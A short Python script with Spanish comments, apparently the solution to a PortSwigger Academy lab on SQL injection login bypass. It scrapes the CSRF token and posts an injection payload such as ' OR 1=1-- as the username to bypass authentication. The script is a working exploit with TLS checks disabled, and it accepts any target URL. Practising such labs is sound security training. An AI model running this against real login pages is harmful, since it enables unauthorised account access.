#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection Login Bypass Script
PortSwigger Academy - Lab: SQL injection vulnerability allowing login bypass
Autor: Sputnik
"""

import requests
import sys
from bs4 import BeautifulSoup

# Configura Burp Suite como proxy para interceptar el trafico (opcional)
proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
# Desactiva advertencias de certificados SSL auto-firmados
requests.packages.urllib3.disable_warnings()


def get_csrf_token(session, url):
    """
    Extrae el token CSRF desde el formulario de login
    """
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    print(f"[+] CSRF Token encontrado: {csrf_token}")
    return csrf_token


def exploit_sqli(session, url, payload):
    """
    Intenta un login con SQLi usando el token CSRF extraido
    """
    csrf = get_csrf_token(session, url)
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "random"
    }
    r = session.post(url, data=data, verify=False, proxies=proxies, allow_redirects=False)
    print(f"[+] Código de Estado: {r.status_code}")
    print(f"[+] Location: {r.headers.get('Location')}")

    # Si el servidor responde con 302 hacia /my-account, el login fue exitoso
    return r.status_code == 302 and "/my-account" in r.headers.get("Location", "")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Uso: {sys.argv[0]} <url> <payload>")
        print(f"[-] Ejemplo: {sys.argv[0]} https://example.com/login \"' OR 1=1--\"")
        sys.exit(1)

    session = requests.Session()

    if exploit_sqli(session, url, sqli_payload):
        print("[+] SQLI Existosa.")
    else:
        print("[-] Fallo la inyeccion SQL.")
